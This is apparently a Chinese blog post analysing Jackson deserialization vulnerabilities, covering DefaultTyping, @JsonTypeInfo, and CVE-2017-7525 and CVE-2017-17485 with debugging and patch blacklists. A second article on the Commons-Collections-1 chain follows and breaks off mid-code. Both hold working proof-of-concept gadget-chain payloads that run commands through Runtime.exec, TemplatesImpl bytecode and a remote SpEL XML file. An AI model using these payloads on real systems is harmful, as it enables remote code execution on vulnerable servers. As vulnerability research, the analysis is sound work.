NON_FINAL &#125; JAVA_LANG_OBJECT当类里的属性声明为一个Object时，会对该属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化/反序列化的类）。 举个例子，给 People 里添加一个 Object object 的属性： 123456789101112131415161718192021222324252627282930313233public class test1 &#123; public static void main(String[] args) throws IOException &#123; People people = new People(); people.name=\"0range\"; people.age =18; people.object= new Boy(); ObjectMapper objectMapper = new ObjectMapper(); mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT); String json = objectMapper.writeValueAsString(people); System.out.println(json); People readpeople = objectMapper.readValue(json, People.class); System.out.println(readpeople); &#125;&#125;class People&#123; public int age; public String name; public Object object; @Override public String toString() &#123; return String.format(\"age=%d, name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125;class Boy&#123; public int length = 100;&#125; 看看结果： 也就是说，在反序列化的时候，会将类中的夹带的其他类跟着一起还原出来。 OBJECT_AND_NON_CONCRETE当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。（当然，这些类本身需要是合法的、可以被序列化/反序列化的对象）。 此外，enableDefaultTyping()默认的无参数的设置就是此选项。 看看下面这个： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class test2 &#123; public static void main(String args[]) throws IOException &#123; nonePeople p = new nonePeople(); p.age = 10; p.name = \"0range\"; p.object = new Teacher(); p.sex=new MySex(); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE); String json = mapper.writeValueAsString(p); System.out.println(json); nonePeople p2 = mapper.readValue(json, nonePeople.class); System.out.println(p2); &#125;&#125;class nonePeople &#123; public int age; public String name; public Object object; public Sex sex; @Override public String toString() &#123; return String.format(\"age=%d, name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125;class Teacher &#123; public int length = 100;&#125;interface Sex &#123; public void setSex(int sex); public int getSex();&#125;class MySex implements Sex &#123; int sex; @Override public int getSex() &#123; return sex; &#125; @Override public void setSex(int sex) &#123; this.sex = sex; &#125;&#125; 看看结果： NON_CONCRETE_AND_ARRAYS支持上文全部类型的Array类型。 例如下面的代码，我们的Object里存放0range的对象数组： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class test2 &#123; public static void main(String args[]) throws IOException &#123; nonePeople p = new nonePeople(); p.age = 10; p.name = \"0range\"; p.sex=new MySex(); Teacher[] teachers= new Teacher[2]; teachers[0]=new Teacher(); teachers[1]=new Teacher(); p.object = teachers; ObjectMapper mapper = new ObjectMapper(); //设置OBJECT_AND_NON_CONCRETE mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE); String json = mapper.writeValueAsString(p); System.out.println(json); nonePeople p2 = mapper.readValue(json, nonePeople.class); System.out.println(p2); &#125;&#125;class nonePeople &#123; public int age; public String name; public Object object; public Sex sex; @Override public String toString() &#123; return String.format(\"age=%d, name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125;class Teacher &#123; public int length = 100;&#125;interface Sex &#123; public void setSex(int sex); public int getSex();&#125;class MySex implements Sex &#123; int sex; @Override public int getSex() &#123; return sex; &#125; @Override public void setSex(int sex) &#123; this.sex = sex; &#125;&#125; 结果： NON_FINAL除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。 例如下面的代码，添加了类型为0range的变量，非Object也非虚，但也可以被序列化出来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class test2 &#123; public static void main(String args[]) throws IOException &#123; nonePeople p = new nonePeople(); p.age = 10; p.name = \"0range\"; p.object = new Teacher(); p.sex=new MySex(); p.teacher=new Teacher(); ObjectMapper mapper = new ObjectMapper(); //设置NON_FINAL mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); String json = mapper.writeValueAsString(p); System.out.println(json); nonePeople nonePeople = mapper.readValue(json, nonePeople.class); System.out.println(nonePeople); &#125;&#125;class nonePeople &#123; public int age; public String name; public Object object; public Sex sex; public Teacher teacher; @Override public String toString() &#123; return String.format(\"age=%d, name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125;class Teacher &#123; public int length = 100;&#125;interface Sex &#123; public void setSex(int sex); public int getSex();&#125;class MySex implements Sex &#123; int sex; @Override public int getSex() &#123; return sex; &#125; @Override public void setSex(int sex) &#123; this.sex = sex; &#125;&#125; 看结果： 总结DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表： DefaultTyping类型 描述说明 JAVA_LANG_OBJECT 属性的类型为Object OBJECT_AND_NON_CONCRETE 属性的类型为Object、Interface、AbstractClass NON_CONCRETE_AND_ARRAYS 属性的类型为Object、Interface、AbstractClass、Array NON_FINAL 所有除了声明为final之外的属性 @JsonTypeInfo注解@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值： 12345@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM) 讲到底，其实就是给类中属性加注解。 JsonTypeInfo.Id.NONEdemo如下： 123456789101112131415161718192021222324252627public class JTTest &#123; public static void main(String[] args) throws IOException &#123; ObjectMapper mapper= new ObjectMapper(); User user = new User(); user.name= \"0range\"; user.age=100; user.obj=new Height(); String json = mapper.writeValueAsString(user); System.out.println(json); &#125;&#125;class User&#123; public String name; public int age; @JsonTypeInfo(use = JsonTypeInfo.Id.NONE) public Object obj; @Override public String toString()&#123; return \"name:\" + name + \" age:\" + age + \" obj:\" + obj; &#125;&#125;class Height&#123; public int h = 100;&#125; 结果： 和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的。 这种方式的输出结果实际上是我们最想要的，这里只需要相关参数的值，并没有其他一些无用信息。 JsonTypeInfo.Id.CLASS修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.CLASS。 输出看到，object属性中多了”@class”:”com.fxc.Height”，即含有具体的类的信息，同时反序列化出来的object属性Height类对象，即能够成功对指定类型进行序列化和反序列化： 也就是说，在Jackson反序列化的时候如果使用了JsonTypeInfo.Id.CLASS修饰的话，可以通过@class的方式指定相关类，并进行相关调用。 JsonTypeInfo.Id.MINIMAL_CLASS修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.MINIMAL_CLASS。 输出看到，object属性中多了”@c”:”com.fxc.Height”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用。 JsonTypeInfo.Id.NAME修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.NAME。 输出看到，object属性中多了”@type”:”Height”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的。 JsonTypeInfo.Id.CUSTOM其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常： 总结所以按照上述分析，3种情况下可以触发Jackson反序列化漏洞 1、enableDefaultTyping() 2、@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) 3、@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) 调试分析调试代码： 12345678910111213141516171819202122232425262728293031323334353637public class JavaLangObject &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String json=\"&#123;\\\"age\\\":10,\\\"name\\\":\\\"0range\\\",\\\"sex\\\":[\\\"com.fxctest.MySex\\\",&#123;\\\"sex\\\":100&#125;]&#125;\"; People p2 = mapper.readValue(json, People.class); System.out.println(p2); &#125;&#125;class People &#123; public int age; public String name; public Sex sex; @Override public String toString() &#123; return String.format(\"age=%d, name=%s, sex=%d\", age, name,sex.getSex()); &#125;&#125;class MySex implements Sex &#123; int sex; @Override public int getSex() &#123; return sex; &#125; @Override public void setSex(int sex) &#123; this.sex = sex; &#125;&#125;interface Sex &#123; public void setSex(int sex); public int getSex();&#125; 这里函数调用极其复杂，总体归纳出下面这张图： 整体流程： BeanDeserializer.deserialize()函数中，调用了vanillaDeserialize()函数； 跟进去，BeanDeserializer.vanillaDeserialize()函数的实现比较简单，先调用createUsingDefault()函数来调用指定类的无参构造函数来生成类实例； BeanDeserializer.vanillaDeserialize()函数调用完无参的类的构造函数生成实例Bean后，就开始进入do while循环，来循环解析键值对中的属性值并调用deserializeAndSet()函数来解析并设置Bean的属性值； 跟进该SettableBeanProperty.deserialize()函数，可以看到有两个反序列化的代码逻辑，其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析： 跟进AbstractDeserializer.deserializeWithType()函数中，进一步调用了AsArrayTypeDeserializer.deserializeTypedFromObject()函数来解析： 其中 BeanDeserializerBase#vanillaDeserialize 中有两个关键点： 1、StdValueInstantiator#createUsingDefault 方法负责调用 AnnotatedConstructor#call中call方法，然后通过反射方式来寻找我们从json中输入的类。 2、MethodProperty#deserializeAndSet 方法负责寻找相关setter设置，这里也是通过invoke反射的方式。 简单梳理一遍，Jackson反序列化的过程为： 先调用通过无参的构造函数生成目标类实例 接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用Object类型属性的构造函数和setter方法。 结论在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。 利用方式前提条件满足下面三个条件之一即存在Jackson反序列化漏洞： 调用了ObjectMapper.enableDefaultTyping()函数； 对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解； 对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解； 漏洞原理由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。 而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。 CVE-2017-7525（基于TemplatesImpl利用链）环境限制Jackson 2.6系列 &lt; 2.6.7.1 Jackson 2.7系列 &lt; 2.7.9.1 Jackson 2.8系列 &lt; 2.8.8.1 JDK版本为1.7.0_21 本地用的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，commons-codec-1.12，commons-io-2.5，spring-core-4.3.13.RELEASE。 PoC直接上代码，首先是Exploit.java，恶意类： 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class Exploit extends AbstractTranslet &#123; public Exploit() throws Exception &#123; try &#123; BufferedReader br = null; //修改成你想要执行的命令 Process p = Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; StringBuilder sb = new StringBuilder(); while ((line = br.readLine()) != null) &#123; sb.append(line + \"\\n\"); System.out.println(sb); &#125; File file = new File(\"result.txt\"); //if file doesnt exists, then create it if(!file.exists())&#123; file.createNewFile(); &#125; //true = append file FileWriter fileWritter = new FileWriter(file.getName(),true); BufferedWriter bufferWritter = new BufferedWriter(fileWritter); bufferWritter.write(sb.toString()); bufferWritter.close(); System.out.println(sb); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 然后是PoC： 123456789101112131415161718192021222324252627282930313233343536public class PoC &#123; public static void main(String[] args)&#123; String exp = readClassStr(\"/Users/fengxincheng/Desktop/jackson_test/target/classes/com/TemplateImpl/Exploit.class\"); String jsonInput = aposToQuotes(\"&#123;\\\"object\\\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\\n\" + \"&#123;\\n\" + \"'transletBytecodes':['\"+exp+\"'],\\n\" + \"'transletName':'test',\\n\" + \"'outputProperties':&#123;&#125;\\n\" + \"&#125;\\n\" + \"]\\n\" + \"&#125;\"); System.out.printf(jsonInput); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); Test test; try &#123; test = mapper.readValue(jsonInput, Test.class); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static String aposToQuotes(String json)&#123; return json.replace(\"'\",\"\\\"\"); &#125; public static String readClassStr(String cls)&#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); try &#123; FileCopyUtils.copy(new FileInputStream(new File(cls)),byteArrayOutputStream); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encode(byteArrayOutputStream.toByteArray()); &#125;&#125; Test.java 123public class Test &#123; public Object object;&#125; 运行结果，成功弹出计算器： 这里我们看下PoC： 12345678910&#123; \"object\":[ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", &#123; \"transletBytecodes\":[\"xxx\"], \"transletName\":\"test\", \"outputProperties\":&#123;&#125; &#125; ]&#125; 这里解释下设置的几个JSON键值对： transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的Fastjson系列； transletName——TemplatesImpl类对象的_name属性值； outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用； 跟进调试在mapper.readValue(jsonInput, Mi1k7ea.class);中打下断点；同时，我们由之前Fastjson中的分析也知道，TemplatesImpl利用链的其中一步是调用了getOutputProperties()函数，我们也在这里打下断点。 下面开始调试，其中反序列化的处理过程和之前调试的一样，我们直接跟到关键的地方看看就好。 我们知道在BeanDeserializer.vanillaDeserialize()函数中会先新建Bean实例，然后调用deserializeAndSet()函数来解析属性值并设置到该Bean中；而在deserializeAndSet()函数中，会反射调用属性的setter方法来设置属性值。 前两个属性transletBytecodes和transletName都是通过反射机制调用setter方法设置的，但是outputProperties属性在deserializeAndSet()函数中是通过反射机制调用它的getter方法，这就是该利用链能被成功触发的原因，虽然Jackson的反序列化机制只是调用setter方法，但是是调用SetterlessProperty.deserializeAndSet()来解析outputProperties属性而前面两个属性是调用的MethodProperty.deserializeAndSet()解析的，其中SetterlessProperty.deserializeAndSet()函数中是调用属性的getter方法而非setter方法。 利用链：getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;恶意类构造函数 PoC不写该属性值的话会报错，我们调试分析下原因。 跟踪到getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()这条调用链时发现，问题出在TemplatesImpl.getTransletInstance()函数中： 由于此处_name为null，导致程序提前return了，并未进入后面生成该Java类实例的代码中，从而也无法成功触发漏洞。 由前面调试分析可知，transletBytecodes和transletName属性值都是通过调用MethodProperty.deserializeAndSet()函数来反射调用其setter方法来设置的。 这里重新带上transletName属性，再次调试，跟进设置transletName属性值时的MethodProperty.deserializeAndSet()函数中，发现其调用的setter方法就是TemplatesImpl.setTransletName()函数： 在大版本下，JDK1.7和1.8中，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类是有所不同的。 当然，在小版本较高的1.7和某些1.8的还是能够成功触发的，具体的可自行测试。 在我本地的JDK 1.8.0_73 版本中，看到在TemplatesImpl.getTransletInstance()方法中调用了defineTransletClasses()函数来定义Java类，跟进看看： 区别在于新建TransletClassLoader类实例的代码，其中调用了_factory属性，但是该属性值我们没有在PoC中设置，默认为null，于是就会抛出异常了。 那么如何设置这个_factory属性呢？我们在PoC中随便填入如&#39;_factory&#39;:{},，会看到如下错误信息： 1com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field \"_factory\" (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: \"uriresolver\", \"transletBytecodes\", \"outputProperties\", \"transletName\", \"stylesheetDOM\"]) 可以看到，这个错误是Jackson.databind报的，说的是TemplatesImpl类已知的只有5个配置项，即”uriresolver”, “transletBytecodes”, “outputProperties”, “transletName”, “stylesheetDOM”。 在里面没有看到tfactory相关字样，也就是说，Jackson压根就不支持我们在序列化的TemplatesImpl类的内容上添加并解析_tfactory属性。 补丁分析这里将jackson-databind-2.7.9换成jackson-databind-2.7.9.1。 尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载： 1com.fasterxml.jackson.databind.JsonMappingException: Illegal type (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) to deserialize: prevented for security reasons 调试分析，在调用BeanDeserializerFactory.createBeanDeserializer()函数创建Bean反序列化器的时候，其中会调用checkIllegalTypes()函数提取当前类名，然后使用黑名单进行过滤： 注意：实际调试的时候回调用两次BeanDeserializerFactory.createBeanDeserializer()-&gt;checkIllegalTypes()，第一次由于是Mi1k7ea类，因此不会被过滤；第二次是TemplatesImpl类，由于其在黑名单中，因此被过滤了。 在jackson-databind-2.7.9.1-sources.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java中，存在默认的黑名单DEFAULT_NO_DESER_CLASS_NAMES，将TemplatesImpl类以及早期其他常用反序列化利用类都过滤了。 1234567891011121314static &#123; Set&lt;String&gt; s = new HashSet&lt;String&gt;(); // Courtesy of [https://github.com/kantega/notsoserial]: // (and wrt [databind#1599] s.add(\"org.apache.commons.collections.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections.functors.InstantiateTransformer\"); s.add(\"org.apache.commons.collections4.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections4.functors.InstantiateTransformer\"); s.add(\"org.codehaus.groovy.runtime.ConvertedClosure\"); s.add(\"org.codehaus.groovy.runtime.MethodClosure\"); s.add(\"org.springframework.beans.factory.ObjectFactory\"); s.add(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);&#125; CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）影响版本Jackson 2.7系列 &lt; 2.7.9.2 Jackson 2.8系列 &lt; 2.8.11 Jackson 2.9系列 &lt; 2.9.4 不受JDK限制，可直接在JDK1.8上运行。 需要服务端环境存在额外的jar包，以本地环境为例：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-expression-5.0.2.RELEASE，commons-logging-1.2。 PoC该漏洞需要 Spting spel表达式的配合。 首先在本地起一个http服务，spel.xml： 123456789&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;&lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\"&gt; &lt;constructor-arg value=\"/Applications/Calculator.app/Contents/MacOS/Calculator\" /&gt; &lt;property name=\"whatever\" value=\"#&#123; pb.start() &#125;\"/&gt;&lt;/bean&gt;&lt;/beans&gt; PoC代码： 12345678910111213public class PoC &#123; public static void main(String[] args) &#123; //CVE-2017-17485 String payload = \"[\\\"org.springframework.context.support.ClassPathXmlApplicationContext\\\", \\\"http://127.0.0.1:8000/spel.xml\\\"]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try &#123; mapper.readValue(payload, Object.class); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 成功触发： 跟进调试本次的利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。 我们在mapper.readValue(payload, Object.class);上打上断点开始调试。 首先进入： 调试到UntypedObjectDeserializer.deserializeWithType()函数，其中会调用AsArrayTypeDeserializer.deserializeTypedFromAny()函数来解析我们数组形式的JSON内容： 继续往下调试，我们在看会调用BeanDeserializerBase.deserializeFromString()函数来反序列化字符串内容，它会返回一个调用createFromString()函数从字符串中创建的实例对象： 跟进去看StdValueInstantiator.createFromString()函数，此时_fromStringCreator变量为AnnotatedConstructor类实例，参数value值为http://127.0.0.1:8000/spel.xml，接着就是调用AnnotatedConstructor.call1()： 继续向下调试，this._fromStringCreator.call1(value);这个函数，发现调用了Constructor.newInstance()方法来创建新的实例： 往下调试，会调用到ClassPathXmlApplicationContext类的构造函数，看到configLocations参数值为spel.xml文件所在的URL地址，由于refresh参数值为True，因此会调用到refresh()函数： 注意：前面调用newInstance()是新建我们的利用类org.springframework.context.support.ClassPathXmlApplicationContext的实例，但是我们看到并没有调用ClassPathXmlApplicationContext类相关的setter方法，这是因为该类本身就没有setter方法，但是拥有构造函数，因此Jackson反序列化的时候会自动调用ClassPathXmlApplicationContext类的构造函数。而这个点就是和之前的利用链的不同之处，该类的漏洞点出在自己的构造函数而非在setter方法中。 下面我们继续调试看看ClassPathXmlApplicationContext类的构造函数中是哪里存在有漏洞。 跟进refresh()函数，进行一系列refresh之前的准备操作后，发现调用了invokeBeanFactoryPostProcessors()函数，顾名思义，就是调用上下文中注册为beans的工厂处理器： 跟进invokeBeanFactoryPostProcessors()函数中调用了getBeanNamesForType()函数来获取Bean名类型： 跟进往下，进一步调用doGetBeanNamesForType()函数： 在doGetBeanNamesForType()函数中，调用isFactoryBean()判断当前beanName是否为FactoryBean，此时beanName参数值为”pb”，mbd参数中识别到bean标签中的类为java.lang.ProcessBuilder： 在isFactoryBean()函数中，调用predictBeanType()函数获取Bean类型： 跟进predictBeanType函数，通过调用determineTargetType()函数来预测Bean类型： 跟进去，determineTargetType()函数中通过调用getTargetType()函数来确定目标类型： 跟下去，AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()，用来解析Bean类，其中调用了evaluateBeanDefinitionString()函数来执行Bean定义的字符串内容，此时className参数指向”java.lang.ProcessBuilder”： 跟进AbstractBeanFactory.evaluateBeanDefinitionString()函数，其中调用了this.beanExpressionResolver.evaluate()，此时this.beanExpressionResolver指向的是StandardBeanExpressionResolver，也就是说已经调用到对应的SpEL表达式解析器了： 跟进StandardBeanExpressionResolver.evaluate()函数，发现调用了Expression.getValue()方法即SpEL表达式执行的方法，其中sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式： 至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的org.springframework.context.support.ClassPathXmlApplicationContext类，它的构造函数存在SpEL注入漏洞，进而导致可被利用来触发Jackson反序列化漏洞。 补丁分析看一下换成jackson-databind-2.7.9.2版本的jar试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作： com.fasterxml.jackson.databind.JsonMappingException: Illegal type (org.springframework.context.support.ClassPathXmlApplicationContext) to deserialize: prevented for security reasons 在jackson-databind-2.7.9.2-sources.jar!\\com\\fasterxml\\jackson\\databind\\jsontype\\impl\\SubTypeValidator.java中可以看到具体的黑名单信息，很遗憾的是没看到我们的利用类： 12345678910111213141516171819202122232425262728static &#123; Set&lt;String&gt; s = new HashSet&lt;String&gt;(); // Courtesy of [https://github.com/kantega/notsoserial]: // (and wrt [databind#1599]) s.add(\"org.apache.commons.collections.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections.functors.InstantiateTransformer\"); s.add(\"org.apache.commons.collections4.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections4.functors.InstantiateTransformer\"); s.add(\"org.codehaus.groovy.runtime.ConvertedClosure\"); s.add(\"org.codehaus.groovy.runtime.MethodClosure\"); s.add(\"org.springframework.beans.factory.ObjectFactory\"); s.add(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); s.add(\"org.apache.xalan.xsltc.trax.TemplatesImpl\"); // [databind#1680]: may or may not be problem, take no chance s.add(\"com.sun.rowset.JdbcRowSetImpl\"); // [databind#1737]; JDK provided s.add(\"java.util.logging.FileHandler\"); s.add(\"java.rmi.server.UnicastRemoteObject\"); // [databind#1737]; 3rd party //s.add(\"org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor\"); // deprecated by [databind#1855] s.add(\"org.springframework.beans.factory.config.PropertyPathFactoryBean\"); s.add(\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"); s.add(\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"); // [databind#1855]: more 3rd party s.add(\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"); s.add(\"com.sun.org.apache.bcel.internal.util.ClassLoader\"); DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);&#125; 那么如何修补的呢？调试看看。 在调用BeanDeserializerFactory.createBeanDeserializer()时，其中会调用_validateSubType()函数对子类型进行校验： 在SubTypeValidator._validateSubType()函数中看到，先进行黑名单过滤，发现类名不在黑名单后再判断是否是以”org.springframe”开头的类名，是的话循环遍历目标类的父类是否为”AbstractPointcutAdvisor”或”AbstractApplicationContext”，是的话跳出循环然后抛出异常： 而我们的利用类其继承关系是这样的： …-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext 可以看到，ClassPathXmlApplicationContext类是继承自AbstractApplicationContext类的，而该类会被过滤掉，从而没办法成功绕过利用。 参考1 2","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}]},{"title":"【反序列化漏洞】commons-collections-1 组件","slug":"【反序列化漏洞】commons-collections-1 组件","date":"2020-09-11T02:30:20.000Z","updated":"2021-05-11T08:22:17.170Z","comments":true,"path":"【反序列化漏洞】commons-collections-1 组件/","link":"","permalink":"https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/","excerpt":"序言 往事依稀浑似梦，都随风雨到心头。 今天来看经典漏洞CC链，害，经典还债环节。","text":"序言 往事依稀浑似梦，都随风雨到心头。 今天来看经典漏洞CC链，害，经典还债环节。 commons-collections-1首先来看看commons-collections项目吧官网第一段： Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 Java集合：Collection，Map Collection：List，Set Map：HashMap 它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能： Transforming decorators that alter each object as it is added to the collection 转化装饰器：修改每一个添加到collection中的object Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。 org.apache.commons.collections.Transformer这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是利用了这一点。 漏洞复现需要下载3.1版本源码3.1版本的下载地址，进去寻觅一下源码和jar包都有。 PoC分析这里找一个网上传烂了的PoC： 123456789101112131415161718192021222324252627282930313233343536import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class cc1 &#123; public static void main(String[] args) &#123; //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"open /Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 onlyElement.setValue(\"foobar\"); &#125;&#125; 这里借用lalajun总结的3要素： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；把它称为：payload 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链) readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…） 把断点下在setValue点处，查看调用栈： 先进入1次ConstantTransformer.class: 3次InvokerTransformer.class： 有两种，这里是由于org.apache.commons.collections.functors.ChainedTransformer#transform这个函数内部的循环有很多细节： 12345678public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; //循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class object = this.iTransformers[i].transform(object); 